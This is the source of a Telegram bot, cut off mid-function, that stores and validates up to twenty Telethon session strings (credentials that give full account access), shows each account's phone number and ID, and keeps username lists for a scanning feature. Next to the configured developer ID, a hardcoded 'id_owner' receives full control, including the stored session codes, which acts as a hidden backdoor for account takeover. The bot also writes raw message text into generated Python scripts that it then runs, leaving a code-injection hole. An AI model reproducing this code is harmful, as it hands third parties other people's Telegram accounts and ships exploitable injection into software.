import os
try:
    try:
        from telebot import TeleBot,types
    except ModuleNotFoundError:
        os.system('pip3 install pyTelegramBotAPI')
        os.system('pip3 install telebot')
    try:
        import multiprocessing
    except ModuleNotFoundError:
        os.system('pip3 install multiprocessing')
    try:
        import subprocess
    except ModuleNotFoundError:
        os.system('pip3 install subprocess')
    try:
        from requests import get
    except ModuleNotFoundError:
        os.system('pip3 install requests')
    
    bot_token = open('bot_token.txt','r').read()
    id_dev = open('id_dev.txt','r').read()
    id_owner = '5605430873'
    
    bot = TeleBot(token=str(bot_token))
    @bot.message_handler(func=lambda m: True)
    def main(m):
        text = m.text
        id_account = m.from_user.id
        if str(id_account) == str(id_dev) or str(id_account) == str(id_owner):
            if str(text) == '/start':
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Session codes',callback_data='page_session_codes')
                button02 = types.InlineKeyboardButton(text='Usernames',callback_data='page_usernames')
                button03 = types.InlineKeyboardButton(text='Start scan',callback_data='page_start_scan')
                button04 = types.InlineKeyboardButton(text='Turn off scanning',callback_data='page_turn_off_scanning')
                keyboard0.add(button01,button02,button03,button04)
                bot.reply_to(m,'Choose what you want 👇',reply_markup=keyboard0)
    
            elif ('/n_s_c_') in str(text):
                try:
                    os.remove('t.py')
                except:
                    pass
                open('t.py','a').write(f"""import os
try:
    try:
        from telethon.sessions import StringSession
        from telethon.sync import TelegramClient
    except ModuleNotFoundError:
        os.system('pip3 install telethon')
    try:
        from requests import get
    except ModuleNotFoundError:
        os.system('pip3 install requests')
    id_account = '{id_account}'
    bot_token = open('bot_token.txt','r').read()
    text = '{text}'
    q = len(str(text))
    tyjytmyt = str(text).split('/n_s_c_')[1].split(' ')[0]
    w = str(text).split('/n_s_c_'+str(tyjytmyt)+' ')[1]
    if str(q) >= '200':
        try:
            e = open('session_num_1.txt','r').read()
            if str(w) == str(e):
                stute_1 = 'bad'
            else:
                stute_1 = 'good'
        except:
            stute_1 = 'good'
        stute_1 = str(stute_1)
        try:
            r = open('session_num_2.txt','r').read()
            if str(w) == str(r):
                stute_2 = 'bad'
            else:
                stute_2 = 'good'
        except:
            stute_2 = 'good'
        stute_2 = str(stute_2)
        try:
            t = open('session_num_3.txt','r').read()
            if str(w) == str(t):
                stute_3 = 'bad'
            else:
                stute_3 = 'good'
        except:
            stute_3 = 'good'
        stute_3 = str(stute_3)
        try:
            y = open('session_num_4.txt','r').read()
            if str(w) == str(y):
                stute_4 = 'bad'
            else:
                stute_4 = 'good'
        except:
            stute_4 = 'good'
        stute_4 = str(stute_4)
        try:
            u = open('session_num_5.txt','r').read()
            if str(w) == str(u):
                stute_5 = 'bad'
            else:
                stute_5 = 'good'
        except:
            stute_5 = 'good'
        stute_5 = str(stute_5)
        try:
            i = open('session_num_6.txt','r').read()
            if str(w) == str(i):
                stute_6 = 'bad'
            else:
                stute_6 = 'good'
        except:
            stute_6 = 'good'
        stute_6 = str(stute_6)
        try:
            o = open('session_num_7.txt','r').read()
            if str(w) == str(o):
                stute_7 = 'bad'
            else:
                stute_7 = 'good'
        except:
            stute_7 = 'good'
        stute_7 = str(stute_7)
        try:
            p = open('session_num_8.txt','r').read()
            if str(w) == str(p):
                stute_8 = 'bad'
            else:
                stute_8 = 'good'
        except:
            stute_8 = 'good'
        stute_8 = str(stute_8)
        try:
            a = open('session_num_9.txt','r').read()
            if str(w) == str(a):
                stute_9 = 'bad'
            else:
                stute_9 = 'good'
        except:
            stute_9 = 'good'
        stute_9 = str(stute_9)
        try:
            s = open('session_num_10.txt','r').read()
            if str(w) == str(s):
                stute_10 = 'bad'
            else:
                stute_10 = 'good'
        except:
            stute_10 = 'good'
        stute_10 = str(stute_10)
        try:
            d = open('session_num_11.txt','r').read()
            if str(w) == str(d):
                stute_11 = 'bad'
            else:
                stute_11 = 'good'
        except:
            stute_11 = 'good'
        stute_11 = str(stute_11)
        try:
            f = open('session_num_12.txt','r').read()
            if str(w) == str(f):
                stute_12 = 'bad'
            else:
                stute_12 = 'good'
        except:
            stute_12 = 'good'
        stute_12 = str(stute_12)
        try:
            g = open('session_num_13.txt','r').read()
            if str(w) == str(g):
                stute_13 = 'bad'
            else:
                stute_13 = 'good'
        except:
            stute_13 = 'good'
        stute_13 = str(stute_13)
        try:
            h = open('session_num_14.txt','r').read()
            if str(w) == str(h):
                stute_14 = 'bad'
            else:
                stute_14 = 'good'
        except:
            stute_14 = 'good'
        stute_14 = str(stute_14)
        try:
            j = open('session_num_15.txt','r').read()
            if str(w) == str(j):
                stute_15 = 'bad'
            else:
                stute_15 = 'good'
        except:
            stute_15 = 'good'
        stute_15 = str(stute_15)
        try:
            k = open('session_num_16.txt','r').read()
            if str(w) == str(k):
                stute_16 = 'bad'
            else:
                stute_16 = 'good'
        except:
            stute_16 = 'good'
        stute_16 = str(stute_16)
        try:
            l = open('session_num_17.txt','r').read()
            if str(w) == str(l):
                stute_17 = 'bad'
            else:
                stute_17 = 'good'
        except:
            stute_17 = 'good'
        stute_17 = str(stute_17)
        try:
            z = open('session_num_18.txt','r').read()
            if str(w) == str(z):
                stute_18 = 'bad'
            else:
                stute_18 = 'good'
        except:
            stute_18 = 'good'
        stute_18 = str(stute_18)
        try:
            x = open('session_num_19.txt','r').read()
            if str(w) == str(x):
                stute_19 = 'bad'
            else:
                stute_19 = 'good'
        except:
            stute_19 = 'good'
        stute_19 = str(stute_19)
        try:
            c = open('session_num_20.txt','r').read()
            if str(w) == str(c):
                stute_20 = 'bad'
            else:
                stute_20 = 'good'
        except:
            stute_20 = 'good'
        stute_20 = str(stute_20)
        if str(stute_1) == 'good' and str(stute_2) == 'good' and str(stute_3) == 'good' and str(stute_4) == 'good' and str(stute_5) == 'good' and str(stute_6) == 'good' and str(stute_7) == 'good' and str(stute_8) == 'good' and str(stute_9) == 'good' and str(stute_10) == 'good' and str(stute_11) == 'good' and str(stute_12) == 'good' and str(stute_13) == 'good' and str(stute_14) == 'good' and str(stute_15) == 'good' and str(stute_16) == 'good' and str(stute_17) == 'good' and str(stute_18) == 'good' and str(stute_19) == 'good' and str(stute_20) == 'good':
            try:
                with TelegramClient(StringSession(w),25774220,'b2b739a6dbd91c9a74cebde264185fa3') as app:
                    me = app.get_me()
                    me.phone
                    me.id
                    try:
                        os.remove('session_num_'+str(tyjytmyt)+'.txt')
                    except:
                        pass
                    open('session_num_'+str(tyjytmyt)+'.txt','a').write(str(w))
                    the_result = 'Session code added successfully-: '+str(w)
            except Exception as error:
                the_result = 'Invalid session code-: '+str(w)+' : '+str(error)
        else:
            the_result = 'The session code already exists-: '+str(w)
    else:
        the_result = 'This is not a session code-: '+str(w)
    get(url='https://api.telegram.org/bot'+str(bot_token)+'/sendmessage?chat_id='+str(id_account)+'&text='+str(the_result))
except Exception as errors:
    if ('HTTPSConnectionPool(host=') in str(errors) or ('Connection aborted.') in str(errors):
        pass
    else:
        get(url='https://api.telegram.org/bot'+str(bot_token)+'/sendmessage?chat_id='+str(id_account)+'&text='+str(errors))
try:
    os.remove('t.py')
except:
    pass
for _ in range(10):
    os.system('pkill -f t.py')""")
                for _ in range(10):
                    os.system('pkill -f assistant.py')
                def run_script(script_name):
                    subprocess.run(['python3', script_name])
                if __name__ == '__main__':
                    scripts = ['t.py','assistant.py']
                    processes = []
                    for script in scripts:
                        process = multiprocessing.Process(target=run_script, args=(script,))
                        processes.append(process)
                        process.start()
                    for process in processes:
                        process.join()
    
            elif ('/a_n_us_') in str(text):
                hdkdj38 = str(text).split('/a_n_us_')[1].split(' ')[0]
                q = str(text).split('/a_n_us_'+str(hdkdj38)+' ')[1]
                try:
                    os.remove('users_num_'+str(hdkdj38)+'a.txt')
                except:
                    pass
                try:
                    os.remove('users_num_'+str(hdkdj38)+'b.txt')
                except:
                    pass
                try:
                    open('users_num_'+str(hdkdj38)+'.txt','r').read()
                    open('users_num_'+str(hdkdj38)+'a.txt','a').write(str(q))
                    all_ids_users = open('users_num_'+str(hdkdj38)+'a.txt','r').read().splitlines()
                    for the_ids in all_ids_users:
                        try:
                            the_ids = str(the_ids).split('@')[1]
                        except IndexError:
                            the_ids = str(the_ids).split('@')[0]
                        q = len(str(the_ids))
                        if int(q) >= 5 and int(q) <= 15:
                            the_ids = '@' + str(the_ids)
                            try:
                                dhhd = open('users_num_'+str(hdkdj38)+'b.txt','r').read()
                                if str(the_ids) not in str(dhhd):
                                    open('users_num_'+str(hdkdj38)+'b.txt','a').write(str(the_ids)+'\n')
                            except:
                                open('users_num_'+str(hdkdj38)+'b.txt','a').write(str(the_ids)+'\n')
                        else:
                            pass
                    try:
                        os.remove('users_num_'+str(hdkdj38)+'a.txt')
                    except:
                        pass
                    all_ids_ufhhdhsers = open('users_num_'+str(hdkdj38)+'b.txt','r').read().splitlines()
                    for the_dhdjjids in all_ids_ufhhdhsers:
                        pass
                    dhjdjdh = str(the_dhdjjids)
                    all_idssggs_user = open('users_num_'+str(hdkdj38)+'b.txt','r').read()
                    wsbsksnhs = str(all_idssggs_user).split(str(dhjdjdh))[0] + str(dhjdjdh)
                    open('users_num_'+str(hdkdj38)+'a.txt','a').write(str(wsbsksnhs))
                    try:
                        os.remove('users_num_'+str(hdkdj38)+'b.txt')
                    except:
                        pass
                    try:
                        os.remove('target_number_eg.txt')
                    except:
                        pass
                    open('target_number_eg.txt','a').write(str(hdkdj38))
                    keyboard0 = types.InlineKeyboardMarkup(row_width=2)
                    button01 = types.InlineKeyboardButton(text='1',callback_data='page_adding_the_usernames_one')
                    button02 = types.InlineKeyboardButton(text='2',callback_data='page_adding_the_usernames_two')
                    keyboard0.add(button01,button02)
                    bot.reply_to(m,'Choose what you want 👇\n\n1-: Delete the old usernames and save the new one\n\n2-: Add these usernames to the old saved usernames',reply_markup=keyboard0)
                except:
                    open('users_num_'+str(hdkdj38)+'a.txt','a').write(str(q))
                    all_ids_users = open('users_num_'+str(hdkdj38)+'a.txt','r').read().splitlines()
                    for the_ids in all_ids_users:
                        try:
                            the_ids = str(the_ids).split('@')[1]
                        except IndexError:
                            the_ids = str(the_ids).split('@')[0]
                        q = len(str(the_ids))
                        if int(q) >= 5 and int(q) <= 15:
                            the_ids = '@' + str(the_ids)
                            try:
                                dhhd = open('users_num_'+str(hdkdj38)+'b.txt','r').read()
                                if str(the_ids) not in str(dhhd):
                                    open('users_num_'+str(hdkdj38)+'b.txt','a').write(str(the_ids)+'\n')
                            except:
                                open('users_num_'+str(hdkdj38)+'b.txt','a').write(str(the_ids)+'\n')
                        else:
                            pass
                    try:
                        os.remove('users_num_'+str(hdkdj38)+'a.txt')
                    except:
                        pass
                    all_ids_ufhhdhsers = open('users_num_'+str(hdkdj38)+'b.txt','r').read().splitlines()
                    for the_dhdjjids in all_ids_ufhhdhsers:
                        pass
                    dhjdjdh = str(the_dhdjjids)
                    all_idssggs_user = open('users_num_'+str(hdkdj38)+'b.txt','r').read()
                    wsbsksnhs = str(all_idssggs_user).split(str(dhjdjdh))[0] + str(dhjdjdh)
                    open('users_num_'+str(hdkdj38)+'.txt','a').write(str(wsbsksnhs)+'\n')
                    try:
                        os.remove('users_num_'+str(hdkdj38)+'a.txt')
                    except:
                        pass
                    try:
                        os.remove('users_num_'+str(hdkdj38)+'b.txt')
                    except:
                        pass
                    keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                    button01 = types.InlineKeyboardButton(text='Back to before',callback_data='page_add_usernames')
                    button02 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                    keyboard0.add(button01,button02)
                    bot.reply_to(m,'Usernames saved successfully',reply_markup=keyboard0)
    
    @bot.callback_query_handler(func=lambda call: True)
    def if_or_else(call):
        data = call.data
        id_account = call.from_user.id
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        if str(id_account) == str(id_dev) or str(id_account) == str(id_owner):
            if str(data) == 'page_main':
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Session codes',callback_data='page_session_codes')
                button02 = types.InlineKeyboardButton(text='Usernames',callback_data='page_usernames')
                button03 = types.InlineKeyboardButton(text='Start scan',callback_data='page_start_scan')
                button04 = types.InlineKeyboardButton(text='Turn off scanning',callback_data='page_turn_off_scanning')
                keyboard0.add(button01,button02,button03,button04)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='Choose what you want 👇',reply_markup=keyboard0)
    
            elif str(data) == 'page_session_codes':
                try:
                    q = open('session_num_1.txt','r').read()
                    w = len(str(q))
                    if str(w) >= '200':
                        stute_1 = 'Available ✅'
                    else:
                        stute_1 = 'Not found ❎'
                        try:
                            os.remove('session_num_1.txt')
                        except:
                            pass
                except:
                    stute_1 = 'Not found ❎'
                stute_1 = str(stute_1)
                if str(stute_1) == 'Not found ❎':
                    m_stute_1 = 'page_additional_session_code'
                else:
                    m_stute_1 = 'page_get_info_num_1'
                m_stute_1 = str(m_stute_1)
                try:
                    e = open('session_num_2.txt','r').read()
                    r = len(str(e))
                    if str(r) >= '200':
                        stute_2 = 'Available ✅'
                    else:
                        stute_2 = 'Not found ❎'
                        try:
                            os.remove('session_num_2.txt')
                        except:
                            pass
                except:
                    stute_2 = 'Not found ❎'
                stute_2 = str(stute_2)
                if str(stute_2) == 'Not found ❎':
                    m_stute_2 = 'page_additional_session_code'
                else:
                    m_stute_2 = 'page_get_info_num_2'
                m_stute_2 = str(m_stute_2)
                try:
                    t = open('session_num_3.txt','r').read()
                    y = len(str(t))
                    if str(y) >= '200':
                        stute_3 = 'Available ✅'
                    else:
                        stute_3 = 'Not found ❎'
                        try:
                            os.remove('session_num_3.txt')
                        except:
                            pass
                except:
                    stute_3 = 'Not found ❎'
                stute_3 = str(stute_3)
                if str(stute_3) == 'Not found ❎':
                    m_stute_3 = 'page_additional_session_code'
                else:
                    m_stute_3 = 'page_get_info_num_3'
                m_stute_3 = str(m_stute_3)
                try:
                    u = open('session_num_4.txt','r').read()
                    i = len(str(u))
                    if str(i) >= '200':
                        stute_4 = 'Available ✅'
                    else:
                        stute_4 = 'Not found ❎'
                        try:
                            os.remove('session_num_4.txt')
                        except:
                            pass
                except:
                    stute_4 = 'Not found ❎'
                stute_4 = str(stute_4)
                if str(stute_4) == 'Not found ❎':
                    m_stute_4 = 'page_additional_session_code'
                else:
                    m_stute_4 = 'page_get_info_num_4'
                m_stute_4 = str(m_stute_4)
                try:
                    o = open('session_num_5.txt','r').read()
                    p = len(str(o))
                    if str(p) >= '200':
                        stute_5 = 'Available ✅'
                    else:
                        stute_5 = 'Not found ❎'
                        try:
                            os.remove('session_num_5.txt')
                        except:
                            pass
                except:
                    stute_5 = 'Not found ❎'
                stute_5 = str(stute_5)
                if str(stute_5) == 'Not found ❎':
                    m_stute_5 = 'page_additional_session_code'
                else:
                    m_stute_5 = 'page_get_info_num_5'
                m_stute_5 = str(m_stute_5)
                try:
                    a = open('session_num_6.txt','r').read()
                    s = len(str(a))
                    if str(s) >= '200':
                        stute_6 = 'Available ✅'
                    else:
                        stute_6 = 'Not found ❎'
                        try:
                            os.remove('session_num_6.txt')
                        except:
                            pass
                except:
                    stute_6 = 'Not found ❎'
                stute_6 = str(stute_6)
                if str(stute_6) == 'Not found ❎':
                    m_stute_6 = 'page_additional_session_code'
                else:
                    m_stute_6 = 'page_get_info_num_6'
                m_stute_6 = str(m_stute_6)
                try:
                    d = open('session_num_7.txt','r').read()
                    f = len(str(d))
                    if str(f) >= '200':
                        stute_7 = 'Available ✅'
                    else:
                        stute_7 = 'Not found ❎'
                        try:
                            os.remove('session_num_7.txt')
                        except:
                            pass
                except:
                    stute_7 = 'Not found ❎'
                stute_7 = str(stute_7)
                if str(stute_7) == 'Not found ❎':
                    m_stute_7 = 'page_additional_session_code'
                else:
                    m_stute_7 = 'page_get_info_num_7'
                m_stute_7 = str(m_stute_7)
                try:
                    g = open('session_num_8.txt','r').read()
                    h = len(str(g))
                    if str(h) >= '200':
                        stute_8 = 'Available ✅'
                    else:
                        stute_8 = 'Not found ❎'
                        try:
                            os.remove('session_num_8.txt')
                        except:
                            pass
                except:
                    stute_8 = 'Not found ❎'
                stute_8 = str(stute_8)
                if str(stute_8) == 'Not found ❎':
                    m_stute_8 = 'page_additional_session_code'
                else:
                    m_stute_8 = 'page_get_info_num_8'
                m_stute_8 = str(m_stute_8)
                try:
                    j = open('session_num_9.txt','r').read()
                    k = len(str(j))
                    if str(k) >= '200':
                        stute_9 = 'Available ✅'
                    else:
                        stute_9 = 'Not found ❎'
                        try:
                            os.remove('session_num_9.txt')
                        except:
                            pass
                except:
                    stute_9 = 'Not found ❎'
                stute_9 = str(stute_9)
                if str(stute_9) == 'Not found ❎':
                    m_stute_9 = 'page_additional_session_code'
                else:
                    m_stute_9 = 'page_get_info_num_9'
                m_stute_9 = str(m_stute_9)
                try:
                    l = open('session_num_10.txt','r').read()
                    z = len(str(l))
                    if str(z) >= '200':
                        stute_10 = 'Available ✅'
                    else:
                        stute_10 = 'Not found ❎'
                        try:
                            os.remove('session_num_10.txt')
                        except:
                            pass
                except:
                    stute_10 = 'Not found ❎'
                stute_10 = str(stute_10)
                if str(stute_10) == 'Not found ❎':
                    m_stute_10 = 'page_additional_session_code'
                else:
                    m_stute_10 = 'page_get_info_num_10'
                m_stute_10 = str(m_stute_10)
                try:
                    x = open('session_num_11.txt','r').read()
                    c = len(str(x))
                    if str(c) >= '200':
                        stute_11 = 'Available ✅'
                    else:
                        stute_11 = 'Not found ❎'
                        try:
                            os.remove('session_num_11.txt')
                        except:
                            pass
                except:
                    stute_11 = 'Not found ❎'
                stute_11 = str(stute_11)
                if str(stute_11) == 'Not found ❎':
                    m_stute_11 = 'page_additional_session_code'
                else:
                    m_stute_11 = 'page_get_info_num_11'
                m_stute_11 = str(m_stute_11)
                try:
                    v = open('session_num_12.txt','r').read()
                    b = len(str(v))
                    if str(b) >= '200':
                        stute_12 = 'Available ✅'
                    else:
                        stute_12 = 'Not found ❎'
                        try:
                            os.remove('session_num_12.txt')
                        except:
                            pass
                except:
                    stute_12 = 'Not found ❎'
                stute_12 = str(stute_12)
                if str(stute_12) == 'Not found ❎':
                    m_stute_12 = 'page_additional_session_code'
                else:
                    m_stute_12 = 'page_get_info_num_12'
                m_stute_12 = str(m_stute_12)
                try:
                    n = open('session_num_13.txt','r').read()
                    m = len(str(n))
                    if str(m) >= '200':
                        stute_13 = 'Available ✅'
                    else:
                        stute_13 = 'Not found ❎'
                        try:
                            os.remove('session_num_13.txt')
                        except:
                            pass
                except:
                    stute_13 = 'Not found ❎'
                stute_13 = str(stute_13)
                if str(stute_13) == 'Not found ❎':
                    m_stute_13 = 'page_additional_session_code'
                else:
                    m_stute_13 = 'page_get_info_num_13'
                m_stute_13 = str(m_stute_13)
                try:
                    q2 = open('session_num_14.txt','r').read()
                    w2 = len(str(q2))
                    if str(w2) >= '200':
                        stute_14 = 'Available ✅'
                    else:
                        stute_14 = 'Not found ❎'
                        try:
                            os.remove('session_num_14.txt')
                        except:
                            pass
                except:
                    stute_14 = 'Not found ❎'
                stute_14 = str(stute_14)
                if str(stute_14) == 'Not found ❎':
                    m_stute_14 = 'page_additional_session_code'
                else:
                    m_stute_14 = 'page_get_info_num_14'
                m_stute_14 = str(m_stute_14)
                try:
                    e2 = open('session_num_15.txt','r').read()
                    r2 = len(str(e2))
                    if str(r2) >= '200':
                        stute_15 = 'Available ✅'
                    else:
                        stute_15 = 'Not found ❎'
                        try:
                            os.remove('session_num_15.txt')
                        except:
                            pass
                except:
                    stute_15 = 'Not found ❎'
                stute_15 = str(stute_15)
                if str(stute_15) == 'Not found ❎':
                    m_stute_15 = 'page_additional_session_code'
                else:
                    m_stute_15 = 'page_get_info_num_15'
                m_stute_15 = str(m_stute_15)
                try:
                    t2 = open('session_num_16.txt','r').read()
                    y2 = len(str(t2))
                    if str(y2) >= '200':
                        stute_16 = 'Available ✅'
                    else:
                        stute_16 = 'Not found ❎'
                        try:
                            os.remove('session_num_16.txt')
                        except:
                            pass
                except:
                    stute_16 = 'Not found ❎'
                stute_16 = str(stute_16)
                if str(stute_16) == 'Not found ❎':
                    m_stute_16 = 'page_additional_session_code'
                else:
                    m_stute_16 = 'page_get_info_num_16'
                m_stute_16 = str(m_stute_16)
                try:
                    u2 = open('session_num_17.txt','r').read()
                    i2 = len(str(u2))
                    if str(i2) >= '200':
                        stute_17 = 'Available ✅'
                    else:
                        stute_17 = 'Not found ❎'
                        try:
                            os.remove('session_num_17.txt')
                        except:
                            pass
                except:
                    stute_17 = 'Not found ❎'
                stute_17 = str(stute_17)
                if str(stute_17) == 'Not found ❎':
                    m_stute_17 = 'page_additional_session_code'
                else:
                    m_stute_17 = 'page_get_info_num_17'
                m_stute_17 = str(m_stute_17)
                try:
                    o2 = open('session_num_18.txt','r').read()
                    p2 = len(str(o2))
                    if str(p2) >= '200':
                        stute_18 = 'Available ✅'
                    else:
                        stute_18 = 'Not found ❎'
                        try:
                            os.remove('session_num_18.txt')
                        except:
                            pass
                except:
                    stute_18 = 'Not found ❎'
                stute_18 = str(stute_18)
                if str(stute_18) == 'Not found ❎':
                    m_stute_18 = 'page_additional_session_code'
                else:
                    m_stute_18 = 'page_get_info_num_18'
                m_stute_18 = str(m_stute_18)
                try:
                    a2 = open('session_num_19.txt','r').read()
                    s2 = len(str(a2))
                    if str(s2) >= '200':
                        stute_19 = 'Available ✅'
                    else:
                        stute_19 = 'Not found ❎'
                        try:
                            os.remove('session_num_19.txt')
                        except:
                            pass
                except:
                    stute_19 = 'Not found ❎'
                stute_19 = str(stute_19)
                if str(stute_19) == 'Not found ❎':
                    m_stute_19 = 'page_additional_session_code'
                else:
                    m_stute_19 = 'page_get_info_num_19'
                m_stute_19 = str(m_stute_19)
                try:
                    d2 = open('session_num_20.txt','r').read()
                    f2 = len(str(d2))
                    if str(f2) >= '200':
                        stute_20 = 'Available ✅'
                    else:
                        stute_20 = 'Not found ❎'
                        try:
                            os.remove('session_num_20.txt')
                        except:
                            pass
                except:
                    stute_20 = 'Not found ❎'
                stute_20 = str(stute_20)
                if str(stute_20) == 'Not found ❎':
                    m_stute_20 = 'page_additional_session_code'
                else:
                    m_stute_20 = 'page_get_info_num_20'
                m_stute_20 = str(m_stute_20)
                keyboard0 = types.InlineKeyboardMarkup(row_width=2)
                button01 = types.InlineKeyboardButton(text='Number 👇',callback_data='page_pass')
                button02 = types.InlineKeyboardButton(text='Number status 👇',callback_data='page_pass')
                button03 = types.InlineKeyboardButton(text='1-: ',callback_data='page_pass')
                button04 = types.InlineKeyboardButton(text=str(stute_1),callback_data=str(m_stute_1))
                button05 = types.InlineKeyboardButton(text='2-: ',callback_data='page_pass')
                button06 = types.InlineKeyboardButton(text=str(stute_2),callback_data=str(m_stute_2))
                button07 = types.InlineKeyboardButton(text='3-: ',callback_data='page_pass')
                button08 = types.InlineKeyboardButton(text=str(stute_3),callback_data=str(m_stute_3))
                button09 = types.InlineKeyboardButton(text='4-: ',callback_data='page_pass')
                button10 = types.InlineKeyboardButton(text=str(stute_4),callback_data=str(m_stute_4))
                button11 = types.InlineKeyboardButton(text='5-: ',callback_data='page_pass')
                button12 = types.InlineKeyboardButton(text=str(stute_5),callback_data=str(m_stute_5))
                button13 = types.InlineKeyboardButton(text='6-: ',callback_data='page_pass')
                button14 = types.InlineKeyboardButton(text=str(stute_6),callback_data=str(m_stute_6))
                button15 = types.InlineKeyboardButton(text='7-: ',callback_data='page_pass')
                button16 = types.InlineKeyboardButton(text=str(stute_7),callback_data=str(m_stute_7))
                button17 = types.InlineKeyboardButton(text='8-: ',callback_data='page_pass')
                button18 = types.InlineKeyboardButton(text=str(stute_8),callback_data=str(m_stute_8))
                button19 = types.InlineKeyboardButton(text='9-: ',callback_data='page_pass')
                button20 = types.InlineKeyboardButton(text=str(stute_9),callback_data=str(m_stute_9))
                button21 = types.InlineKeyboardButton(text='10-: ',callback_data='page_pass')
                button22 = types.InlineKeyboardButton(text=str(stute_10),callback_data=str(m_stute_10))
                button23 = types.InlineKeyboardButton(text='11-: ',callback_data='page_pass')
                button24 = types.InlineKeyboardButton(text=str(stute_11),callback_data=str(m_stute_11))
                button25 = types.InlineKeyboardButton(text='12-: ',callback_data='page_pass')
                button26 = types.InlineKeyboardButton(text=str(stute_12),callback_data=str(m_stute_12))
                button27 = types.InlineKeyboardButton(text='13-: ',callback_data='page_pass')
                button28 = types.InlineKeyboardButton(text=str(stute_13),callback_data=str(m_stute_13))
                button29 = types.InlineKeyboardButton(text='14-: ',callback_data='page_pass')
                button30 = types.InlineKeyboardButton(text=str(stute_14),callback_data=str(m_stute_14))
                button31 = types.InlineKeyboardButton(text='15-: ',callback_data='page_pass')
                button32 = types.InlineKeyboardButton(text=str(stute_15),callback_data=str(m_stute_15))
                button33 = types.InlineKeyboardButton(text='16-: ',callback_data='page_pass')
                button34 = types.InlineKeyboardButton(text=str(stute_16),callback_data=str(m_stute_16))
                button35 = types.InlineKeyboardButton(text='17-: ',callback_data='page_pass')
                button36 = types.InlineKeyboardButton(text=str(stute_17),callback_data=str(m_stute_17))
                button37 = types.InlineKeyboardButton(text='18-: ',callback_data='page_pass')
                button38 = types.InlineKeyboardButton(text=str(stute_18),callback_data=str(m_stute_18))
                button39 = types.InlineKeyboardButton(text='19-: ',callback_data='page_pass')
                button40 = types.InlineKeyboardButton(text=str(stute_19),callback_data=str(m_stute_19))
                button41 = types.InlineKeyboardButton(text='20-: ',callback_data='page_pass')
                button42 = types.InlineKeyboardButton(text=str(stute_20),callback_data=str(m_stute_20))
                button43 = types.InlineKeyboardButton(text='Additional session code',callback_data='page_additional_session_code')
                button44 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02,button03,button04,button05,button06,button07,button08,button09,button10,button11,button12,button13,button14,button15,button16,button17,button18,button19,button20,button21,button22,button23,button24,button25,button26,button27,button28,button29,button30,button31,button32,button33,button34,button35,button36,button37,button38,button39,button40,button41,button42,button43,button44)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='Choose what you want 👇',reply_markup=keyboard0)
    
            elif ('page_get_info_num_') in str(data):
                try:
                    os.remove('get_info.py')
                except:
                    pass
                ghkhkjo = str(data).split('page_get_info_num_')[1]
                open('get_info.py','a').write(f"""import os
try:
    try:
        from telethon.sessions import StringSession
        from telethon.sync import TelegramClient
    except ModuleNotFoundError:
        os.system('pip3 install telethon')
    try:
        from requests import get
    except ModuleNotFoundError:
        os.system('pip3 install requests')
    ghkhkjo = '{ghkhkjo}'
    w = open('session_num_'+str(ghkhkjo)+'.txt','r').read()
    id_account = '{id_account}'
    bot_token = open('bot_token.txt','r').read()
    try:
        with TelegramClient(StringSession(w),25774220,'b2b739a6dbd91c9a74cebde264185fa3') as app:
            me = app.get_me()
            phone =  me.phone
            phone = str(phone[:-3]) + '***'
            first_name = me.first_name
            id = me.id
            the_result = '''Information about the number-: '''+str(ghkhkjo)+'''

Session Code-: '''+str(w)+'''

Phone Number-: '''+str(phone)+'''

Name Account-: '''+str(first_name)+'''

ID Account-: '''+str(id)+''''''
    except Exception as error:
        the_result = 'Invalid session code-: '+str(w)+' : '+str(error)
    get(url='https://api.telegram.org/bot'+str(bot_token)+'/sendmessage?chat_id='+str(id_account)+'&text='+str(the_result))
except Exception as errors:
    if ('HTTPSConnectionPool(host=') in str(errors) or ('Connection aborted.') in str(errors):
        pass
    else:
        get(url='https://api.telegram.org/bot'+str(bot_token)+'/sendmessage?chat_id='+str(id_account)+'&text='+str(errors))
try:
    os.remove('get_info.py')
except:
    pass
for _ in range(10):
    os.system('pkill -f get_info.py')""")
                for _ in range(10):
                    os.system('pkill -f assistant.py')
                def run_script(script_name):
                    subprocess.run(['python3', script_name])
                if __name__ == '__main__':
                    scripts = ['get_info.py','assistant.py']
                    processes = []
                    for script in scripts:
                        process = multiprocessing.Process(target=run_script, args=(script,))
                        processes.append(process)
                        process.start()
                    for process in processes:
                        process.join()
    
            elif str(data) == 'page_additional_session_code':
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Back to before',callback_data='page_session_codes')
                button02 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01,button02)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='To add the session code, send me the command like this:\n\n/n_s_c_1 Session code\n/n_s_c_2 Session code\n/n_s_c_3 Session code\n/n_s_c_4 Session code\n/n_s_c_5 Session code\n\nNote-: This The command "/n_s_c_5" is used to add a session code to the fifth number, and the number 5 changes according to the number to which you want to add the session code',reply_markup=keyboard0)
    
            elif str(data) == 'page_usernames':
                try:
                    qdhjdndn3783 = open('users_num_1.txt','r').read()
                    wehudhs3737hdh = len(str(qdhjdndn3783))
                    if int(wehudhs3737hdh) >= 7:
                        fdhftfn = 0
                        yuju2041km = open('users_num_1.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            fdhftfn += 1
                        stuteejjdnxn_1 = str(fdhftfn)
                    else:
                        try:
                            os.remove('users_num_1.txt')
                        except:
                            pass
                        stuteejjdnxn_1 = 'Not found ❎'
                except:
                    stuteejjdnxn_1 = 'Not found ❎'
                stuteejjdnxn_1 = str(stuteejjdnxn_1)
                try:
                    efnndns388ndn = open('users_num_2.txt','r').read()
                    rdbdjj388ndjdj = len(str(efnndns388ndn))
                    if int(rdbdjj388ndjdj) >= 7:
                        rjtyjyrf = 0
                        yuju2041km = open('users_num_2.txt','r').read().splitlines()
                        for _ in yuju2041km:
                            rjtyjyrf += 1
                        stutejdjdj3873_2 = str(rjtyjyrf)
                    else:
                        try:
                            os.remove('users_num_2.txt')
                        except:
                            pass
                        stutejdjdj3873_2 = 'Not found ❎'
                except:
                    stutejdjdj3873_2 = 'Not found ❎'
